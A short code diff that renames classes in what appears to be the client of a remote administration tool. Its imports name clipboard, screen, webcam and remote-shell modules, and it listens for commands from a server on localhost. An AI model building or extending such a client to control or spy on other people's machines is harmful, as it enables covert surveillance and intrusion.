@@ -8,21 +8,21 @@ from contextlib import suppress
 
 from cryptography.hazmat.primitives.asymmetric import ec
 from modules import clipboard, download, screen, webcam, windows, pyshell
-from utils.baseclient import BaseClient
+from utils.baseclient import Client
 from utils import tasks
 
 logging.basicConfig(level=logging.DEBUG)
 
 BLOCK_SIZE = 32768
 
-class Client(BaseClient):
+class CommandClient(Client):
     """ Client for managing commands """
 
     # List of tasks that have output, but timed out
     task_list: list[tasks.Task] = []
 
     def __init__(self, public_key: ec.EllipticCurvePublicKey) -> None:
-        BaseClient.__init__(self, public_key)
+        Client.__init__(self, public_key)
 
     def listen(self) -> None:
         """ Listen for coming commands """
@@ -297,7 +297,7 @@ if __name__ == '__main__':
         pubkey = serialization.load_pem_public_key(cert_file.read())
 
     # Connect to server
-    client = Client(pubkey)
+    client = CommandClient(pubkey)
     client.connect(('localhost', 6969))
 
     # Listen to commands indefinitely
